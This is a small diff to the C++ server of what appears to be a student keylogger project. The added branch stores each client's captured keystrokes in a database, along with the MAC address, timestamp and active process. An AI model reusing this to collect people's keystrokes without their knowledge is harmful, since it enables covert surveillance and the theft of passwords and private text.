@@ -5,7 +5,7 @@
 // Login   <antoine.plaskowski@epitech.eu>
 // 
 // Started on  Sat Oct 24 17:20:22 2015 Antoine Plaskowski
-// Last update Mon Oct 26 11:03:54 2015 Antoine Plaskowski
+// Last update Mon Oct 26 14:49:04 2015 Antoine Plaskowski
 //
 
 #include	"Server.hpp"
@@ -59,6 +59,13 @@ bool	Server::run(void)
 	    delete *it;
 	    remove = true;
 	    *it = nullptr;
+	  }
+	else
+	  {
+	    auto ret = (*it)->get_keyboard();
+
+	    for (auto lol = ret.begin(); lol != ret.end(); lol++)
+	      m_database.insert_keyboard((*it)->get_mac_address(), (*lol)->time, (*lol)->event, (*lol)->key, (*lol)->process);
 	  }
     }
   if (remove == true)
